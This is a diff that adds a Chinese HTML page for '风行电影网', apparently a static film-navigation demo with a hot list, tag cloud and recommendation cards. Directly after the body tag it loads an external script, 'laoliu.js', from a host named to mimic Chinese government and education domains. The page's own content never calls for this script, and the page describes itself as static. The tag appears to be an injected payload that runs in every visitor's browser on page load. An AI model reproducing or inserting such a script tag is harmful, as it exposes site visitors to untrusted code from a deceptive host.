@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>风行电影网 - 即点即看·热播榜·极速电影导航 | 风行电影网</title>
+<meta name="description" content="风行电影网（fengxingdianyingwang-h5）主打即点即看、热播榜单、高清电影与个性化推荐，像风一样快，找片不等待。">
+<meta name="keywords" content="风行电影网, fengxingdianyingwang-h5, 即点即看, 热播电影, 电影排行榜, 高清电影导航, 边下边看">
+<meta name="author" content="风行电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#0b0d12;
+  --bg2:#11141c;
+  --bg3:#171b25;
+  --line:rgba(255,90,30,.28);
+  --orange:#ff5a1e;
+  --orange2:#ff8a3d;
+  --red:#ff2d2d;
+  --blue:#36c6ff;
+  --text:#f3f5f8;
+  --text2:#aab2c0;
+  --muted:#6b7484;
+  --radius:14px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(1200px 500px at 80% -10%,rgba(255,90,30,.18),transparent 60%),
+    radial-gradient(900px 400px at 0% 10%,rgba(54,198,255,.10),transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 顶部 */
+.topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(11,13,18,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1240px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:20px;font-weight:900;letter-spacing:1px;display:flex;align-items:center;gap:8px}
+.logo .wind{font-size:18px;filter:drop-shadow(0 0 6px var(--orange))}
+.logo b{color:var(--orange)}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:600;padding:6px 4px;position:relative;transition:.25s}
+.nav-menu a:hover{color:var(--orange)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--orange);transition:.25s}
+.nav-menu a:hover::after{width:100%}
+
+/* Hero */
+.hero{margin-top:58px;padding:64px 20px 46px;position:relative;z-index:1}
+.hero-inner{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.15fr .85fr;gap:40px;align-items:center}
+.hero-tag{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;border:1px solid var(--line);background:rgba(255,90,30,.08);color:var(--orange);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-size:clamp(34px,5vw,52px);font-weight:900;line-height:1.12;letter-spacing:-.5px;margin-bottom:16px}
+.hero h1 .strike{color:var(--orange);position:relative;white-space:nowrap}
+.hero h1 .strike::after{content:'';position:absolute;left:-2%;right:-2%;top:54%;height:6px;background:linear-gradient(90deg,var(--orange),var(--red));transform:skewX(-12deg);opacity:.85}
+.hero-desc{color:var(--text2);font-size:15px;margin-bottom:26px;line-height:1.85}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-main{padding:13px 30px;background:linear-gradient(90deg,var(--orange),var(--red));color:#fff;font-weight:800;font-size:14px;letter-spacing:1px;transition:.25s}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,90,30,.35)}
+.btn-sub{padding:13px 30px;border:1px solid var(--text2);color:var(--text);font-weight:700;font-size:14px;transition:.25s}
+.btn-sub:hover{border-color:var(--blue);color:var(--blue)}
+
+/* Hero右侧：极速播放卡 */
+.speed-card{background:linear-gradient(160deg,var(--bg3),var(--bg2));border:1px solid var(--line);border-radius:18px;padding:22px;position:relative;overflow:hidden}
+.speed-card .poster{aspect-ratio:16/10;border-radius:12px;background:
+  linear-gradient(120deg,rgba(255,90,30,.35),transparent 40%),
+  linear-gradient(300deg,rgba(54,198,255,.3),transparent 45%),
+  #0e1118;display:flex;align-items:center;justify-content:center;font-size:46px;position:relative}
+.speed-card .live{position:absolute;top:10px;left:10px;background:var(--red);color:#fff;font-size:10px;font-weight:800;padding:3px 8px;letter-spacing:1px}
+.speed-card .play-btn{position:absolute;width:54px;height:54px;border-radius:50%;background:var(--orange);display:flex;align-items:center;justify-content:center;font-size:20px;color:#fff;box-shadow:0 0 0 0 rgba(255,90,30,.6);animation:pulse 1.8s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,90,30,.55)}70%{box-shadow:0 0 0 18px rgba(255,90,30,0)}100%{box-shadow:0 0 0 0 rgba(255,90,30,0)}}
+.speed-meta{display:flex;justify-content:space-between;margin-top:14px;font-size:12px;color:var(--text2)}
+.bar{height:6px;background:#222838;border-radius:99px;margin-top:12px;overflow:hidden}
+.bar > i{display:block;height:100%;width:68%;background:linear-gradient(90deg,var(--orange),var(--blue));border-radius:99px}
+
+/* 栏目通用 */
+.section{max-width:1240px;margin:0 auto;padding:48px 20px;position:relative;z-index:1}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:26px;font-weight:900;letter-spacing:.5px}
+.sec-head h2 .ac{color:var(--orange)}
+.sec-head p{color:var(--muted);font-size:13px}
+
+/* 栏目1：风速横滑海报带 */
+.wind-strip{background:var(--bg2)}
+.strip{display:flex;gap:14px;overflow-x:auto;padding:6px 2px 14px;scroll-snap-type:x mandatory}
+.strip::-webkit-scrollbar{height:6px}
+.strip::-webkit-scrollbar-thumb{background:var(--orange);border-radius:99px}
+.strip::-webkit-scrollbar-track{background:#0e1118}
+.film-card{min-width:160px;width:160px;flex-shrink:0;scroll-snap-align:start;background:var(--bg3);border:1px solid var(--line);border-radius:12px;overflow:hidden;cursor:pointer;transition:.25s}
+.film-card:hover{transform:translateY(-4px);border-color:var(--orange)}
+.film-card .cover{aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;font-size:40px;background:linear-gradient(160deg,#1b2030,#0e1118)}
+.film-card:nth-child(odd) .cover{background:linear-gradient(160deg,#241a14,#0e1118)}
+.film-card .info{padding:10px 12px}
+.film-card h3{font-size:13px;font-weight:700;margin-bottom:2px}
+.film-card p{font-size:11px;color:var(--muted)}
+.film-card .score{color:var(--orange);font-weight:800;font-size:12px}
+
+/* 栏目2：热播榜跑道 */
+.rank-section{background:var(--bg)}
+.rank-list{max-width:820px;margin:0 auto}
+.rank-row{display:grid;grid-template-columns:54px 1fr auto;gap:16px;align-items:center;padding:14px 16px;background:var(--bg3);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;transition:.25s;cursor:pointer}
+.rank-row:hover{transform:translateX(4px);border-color:var(--orange)}
+.rank-no{font-size:22px;font-weight:900;font-family:ui-monospace,monospace;color:var(--muted);text-align:center}
+.rank-row:nth-child(1) .rank-no{color:var(--orange)}
+.rank-row:nth-child(2) .rank-no{color:#ffd166}
+.rank-row:nth-child(3) .rank-no{color:#7ee787}
+.rank-main h3{font-size:15px;font-weight:700}
+.rank-main p{font-size:12px;color:var(--text2)}
+.rank-heat{font-size:12px;color:var(--orange);font-weight:800;white-space:nowrap}
+.heat-bar{width:90px;height:5px;background:#222838;border-radius:99px;margin-top:5px;overflow:hidden}
+.heat-bar > i{display:block;height:100%;background:linear-gradient(90deg,var(--orange),var(--red))}
+
+/* 栏目3：风向标标签云 */
+.tags-section{background:var(--bg2)}
+.tag-cloud{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;max-width:900px;margin:0 auto}
+.chip{padding:10px 18px;border-radius:99px;border:1px solid var(--line);background:var(--bg3);color:var(--text2);font-weight:700;font-size:13px;transition:.25s;cursor:pointer}
+.chip:hover{color:#fff;border-color:var(--orange);background:rgba(255,90,30,.12);transform:rotate(-2deg)}
+.chip.lg{font-size:16px;padding:12px 22px}
+.chip.xl{font-size:19px;padding:14px 26px;color:var(--orange);border-color:var(--orange)}
+.chip.blue:hover{color:var(--blue);border-color:var(--blue);background:rgba(54,198,255,.1)}
+
+/* 栏目4：个性化推荐流 */
+.feed-section{background:var(--bg)}
+.feed-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.feed-card{background:var(--bg3);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s}
+.feed-card:hover{transform:translateY(-4px);box-shadow:0 14px 36px rgba(0,0,0,.35)}
+.feed-cover{aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;font-size:38px;background:linear-gradient(135deg,#1c2230,#0e1118)}
+.feed-card:nth-child(2n) .feed-cover{background:linear-gradient(135deg,#2a1c16,#0e1118)}
+.feed-body{padding:14px 16px}
+.feed-body .why{font-size:11px;color:var(--orange);font-weight:700;margin-bottom:4px}
+.feed-body h3{font-size:15px;font-weight:800;margin-bottom:4px}
+.feed-body p{font-size:12px;color:var(--text2);line-height:1.6}
+.feed-tags{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}
+.mini-tag{font-size:10px;padding:3px 8px;border:1px solid var(--line);color:var(--muted)}
+
+/* 栏目5：关于+FAQ */
+.about-section{background:var(--bg2)}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.box{background:var(--bg3);border:1px solid var(--line);padding:24px;border-radius:16px}
+.box h3{color:var(--orange);font-size:16px;margin-bottom:10px}
+.box p{color:var(--text2);font-size:13px;line-height:1.85;margin-bottom:8px}
+.faq{border-bottom:1px solid var(--line);padding:12px 0}
+.faq:last-child{border-bottom:none}
+.faq b{color:var(--text);font-size:13px}
+.faq p{color:var(--muted);font-size:12px;margin-top:4px}
+
+/* Footer */
+.footer{background:var(--bg);border-top:1px solid var(--line);padding:34px 20px 18px;text-align:center;color:var(--muted)}
+.footer-logo{font-size:18px;font-weight:900;color:var(--text);margin-bottom:10px}
+.footer-logo b{color:var(--orange)}
+.footer-links{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{color:var(--text2);font-size:12px}
+.footer-links a:hover{color:var(--orange)}
+.footer-copy{font-size:11px;border-top:1px solid var(--line);padding-top:14px}
+.footer-copy a{color:var(--orange)}
+
+@media(max-width:860px){
+  .hero-inner{grid-template-columns:1fr;gap:26px}
+  .speed-card{order:-1}
+  .feed-grid{grid-template-columns:1fr}
+  .about-grid{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{margin-top:96px;padding:30px 16px}
+  .section{padding:34px 16px}
+  .sec-head h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="wind">🌀</span>风行<b>电影网</b></div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#strip">风速片单</a></li>
+        <li><a href="#rank">热播榜</a></li>
+        <li><a href="#tags">风向标</a></li>
+        <li><a href="#feed">为你推荐</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="hero-tag">🌀 fengxingdianyingwang-h5 · 即点即看</span>
+      <h1>像风一样快<br>找片<span class="strike">不等待</span></h1>
+      <p class="hero-desc">风行电影网主打热播榜单、高清片库与个性化推荐：打开就播、边下边看、按你的口味续片。没有花活，只有“马上看”。</p>
+      <div class="hero-btns">
+        <a href="#strip" class="btn-main">▶ 立即开播</a>
+        <a href="#rank" class="btn-sub">看热播榜</a>
+      </div>
+    </div>
+    <div class="speed-card">
+      <div class="poster">
+        <span class="live">LIVE 极速</span>
+        <span>🎬</span>
+        <div class="play-btn">▶</div>
+      </div>
+      <div class="speed-meta">
+        <span>1080P 高清</span>
+        <span>缓冲 0.8s</span>
+        <span>边下边看</span>
+      </div>
+      <div class="bar"><i></i></div>
+      <div class="speed-meta"><span>正在播放：风行者</span><span>68%</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目1：风速横滑海报带 -->
+<section id="strip" class="section wind-strip">
+  <div class="sec-head">
+    <h2>🌀 <span class="ac">风速片单</span> · 横着刷才爽</h2>
+    <p>热更新、热词条、热类型，手指一划就过片</p>
+  </div>
+  <div class="strip" id="strip">
+    <div class="film-card"><div class="cover">🔥</div><div class="info"><h3>风行者</h3><p>动作 / 2026</p><div class="score">9.1</div></div></div>
+    <div class="film-card"><div class="cover">🕶️</div><div class="info"><h3>夜行电台</h3><p>悬疑 / 2025</p><div class="score">8.7</div></div></div>
+    <div class="film-card"><div class="cover">🚗</div><div class="info"><h3>极速边境</h3><p>飙车 / 2026</p><div class="score">8.9</div></div></div>
+    <div class="film-card"><div class="cover">🌃</div><div class="info"><h3>霓虹追凶</h3><p>犯罪 / 2025</p><div class="score">8.5</div></div></div>
+    <div class="film-card"><div class="cover">🛰️</div><div class="info"><h3>轨道之上</h3><p>科幻 / 2026</p><div class="score">9.0</div></div></div>
+    <div class="film-card"><div class="cover">🗡️</div><div class="info"><h3>风起江湖</h3><p>武侠 / 2025</p><div class="score">8.6</div></div></div>
+    <div class="film-card"><div class="cover">💔</div><div class="info"><h3>迟来的风</h3><p>爱情 / 2024</p><div class="score">8.3</div></div></div>
+    <div class="film-card"><div class="cover">👻</div><div class="info"><h3>午夜放映厅</h3><p>惊悚 / 2025</p><div class="score">8.4</div></div></div>
+  </div>
+</section>
+
+<!-- 栏目2：热播榜跑道 -->
+<section id="rank" class="section rank-section">
+  <div class="sec-head">
+    <h2>📈 热播榜 · <span class="ac">全网在追</span></h2>
+    <p>按实时热度排序，风往哪儿吹，片就往哪儿火</p>
+  </div>
+  <div class="rank-list">
+    <div class="rank-row">
+      <div class="rank-no">01</div>
+      <div class="rank-main"><h3>风行者</h3><p>动作 / 1080P / 今日播放 128万</p><div class="heat-bar"><i style="width:96%"></i></div></div>
+      <div class="rank-heat">🔥 9.1</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">02</div>
+      <div class="rank-main"><h3>极速边境</h3><p>飙车 / 高清 / 今日播放 112万</p><div class="heat-bar"><i style="width:90%"></i></div></div>
+      <div class="rank-heat">🔥 8.9</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">03</div>
+      <div class="rank-main"><h3>轨道之上</h3><p>科幻 / 4K / 今日播放 98万</p><div class="heat-bar"><i style="width:84%"></i></div></div>
+      <div class="rank-heat">🔥 9.0</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">04</div>
+      <div class="rank-main"><h3>霓虹追凶</h3><p>犯罪 / 1080P / 今日播放 81万</p><div class="heat-bar"><i style="width:76%"></i></div></div>
+      <div class="rank-heat">🔥 8.5</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">05</div>
+      <div class="rank-main"><h3>风起江湖</h3><p>武侠 / 高清 / 今日播放 74万</p><div class="heat-bar"><i style="width:70%"></i></div></div>
+      <div class="rank-heat">🔥 8.6</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-no">06</div>
+      <div class="rank-main"><h3>夜行电台</h3><p>悬疑 / 1080P / 今日播放 66万</p><div class="heat-bar"><i style="width:64%"></i></div></div>
+      <div class="rank-heat">🔥 8.7</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：风向标标签云 -->
+<section id="tags" class="section tags-section">
+  <div class="sec-head">
+    <h2>🧭 风向标 · <span class="ac">今年刮什么风</span></h2>
+    <p>不是分类，是“当下在流行什么”</p>
+  </div>
+  <div class="tag-cloud">
+    <span class="chip xl">即点即看</span>
+    <span class="chip lg">1080P 高清</span>
+    <span class="chip lg blue">边下边看</span>
+    <span class="chip">港风回归</span>
+    <span class="chip">末日公路</span>
+    <span class="chip blue">AI 科幻</span>
+    <span class="chip">长镜头一镜到底</span>
+    <span class="chip lg">悬疑短剧化</span>
+    <span class="chip">武侠重启</span>
+    <span class="chip blue">赛博都市</span>
+    <span class="chip">女性悬疑</span>
+    <span class="chip lg">复古录像厅</span>
+    <span class="chip">真实事件改编</span>
+    <span class="chip blue">动画成人向</span>
+    <span class="chip">极速追凶</span>
+  </div>
+</section>
+
+<!-- 栏目4：个性化推荐流 -->
+<section id="feed" class="section feed-section">
+  <div class="sec-head">
+    <h2>🎯 为你推荐 · <span class="ac">越看越懂你</span></h2>
+    <p>根据观看习惯生成的私人片单</p>
+  </div>
+  <div class="feed-grid">
+    <div class="feed-card">
+      <div class="feed-cover">🚓</div>
+      <div class="feed-body">
+        <div class="why">因为你看了《极速边境》</div>
+        <h3>追尾协议</h3>
+        <p>深夜高速、连环车祸、一段被删掉的行车记录仪，节奏快得像风。</p>
+        <div class="feed-tags"><span class="mini-tag">飙车</span><span class="mini-tag">悬疑</span><span class="mini-tag">快剪</span></div>
+      </div>
+    </div>
+    <div class="feed-card">
+      <div class="feed-cover">📻</div>
+      <div class="feed-body">
+        <div class="why">因为你收藏了《夜行电台》</div>
+        <h3>凌晨三点档</h3>
+        <p>城市失眠者、匿名来电、老唱片里的密码——慢热但上头。</p>
+        <div class="feed-tags"><span class="mini-tag">悬疑</span><span class="mini-tag">氛围</span><span class="mini-tag">都市怪谈</span></div>
+      </div>
+    </div>
+    <div class="feed-card">
+      <div class="feed-cover">🛸</div>
+      <div class="feed-body">
+        <div class="why">因为你点了《轨道之上》</div>
+        <h3>失重海岸</h3>
+        <p>近未来、海平面上升、最后一班跨海列车，视觉像风一样干净。</p>
+        <div class="feed-tags"><span class="mini-tag">科幻</span><span class="mini-tag">灾难</span><span class="mini-tag">美术封神</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：关于 -->
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>ℹ️ 关于风行电影网</h2>
+    <p>为什么叫“风行”？</p>
+  </div>
+  <div class="about-grid">
+    <div class="box">
+      <h3>风一样的产品</h3>
+      <p>风行电影网（fengxingdianyingwang-h5）把“快”放在第一位：打开即播、热片即时更新、推荐不绕弯。页面像风——轻、快、不挡视线。</p>
+      <p>我们不做信息垃圾场，只做三件事：热片看得见、想看的找得到、点开就能看。</p>
+      <p>单页演示站，内链统一用 # 占位，方便你直接部署到 GitHub Pages。</p>
+    </div>
+    <div class="box">
+      <div class="faq"><b>Q：能直接播片吗？</b><p>A：本页是导航/推荐演示，不存视频文件，点击卡片模拟跳转详情。</p></div>
+      <div class="faq"><b>Q：网址是？</b><p>A：https://fengxingdianyingwang-h5.github.io</p></div>
+      <div class="faq"><b>Q：和前几版区别？</b><p>A：这版强调“极速/榜单/推荐流”，不是艺术化、不是怀旧、不是科幻，是“马上看”。</p></div>
+      <div class="faq"><b>Q：收录友好吗？</b><p>A：唯一 H1、语义化结构、关键词标题与描述，符合必应基础收录规则。</p></div>
+    </div>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo">🌀 风行<b>电影网</b></div>
+  <div class="footer-links">
+    <a href="#strip">风速片单</a>
+    <a href="#rank">热播榜</a>
+    <a href="#tags">风向标</a>
+    <a href="#feed">为你推荐</a>
+    <a href="#about">关于</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 风行电影网 (fengxingdianyingwang-h5). All rights reserved.<br>
+    网站地址: <a href="https://fengxingdianyingwang-h5.github.io">https://fengxingdianyingwang-h5.github.io</a><br>
+    <span style="opacity:.5">即点即看 · 边下边看 · 风往哪吹，片往哪火</span>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.film-card').forEach(function(c){
+  c.addEventListener('click',function(){
+    alert('风速片单：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳转到影片详情（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.rank-row').forEach(function(r){
+  r.addEventListener('click',function(){
+    alert('热播榜：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳转到播放页（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.chip').forEach(function(ch){
+  ch.addEventListener('click',function(){
+    alert('风向标：'+this.textContent.trim()+'\n\n静态演示页，点击后筛选出该风向的影片（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.feed-card').forEach(function(f){
+  f.addEventListener('click',function(){
+    alert('为你推荐：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳转到推荐详情（内链 # 占位）。');
+  });
+});
+document.querySelectorAll('.nav-menu a').forEach(function(a){
+  a.addEventListener('click',function(e){
+    e.preventDefault();
+    var el=document.querySelector(this.getAttribute('href'));
+    if(el) el.scrollIntoView({behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
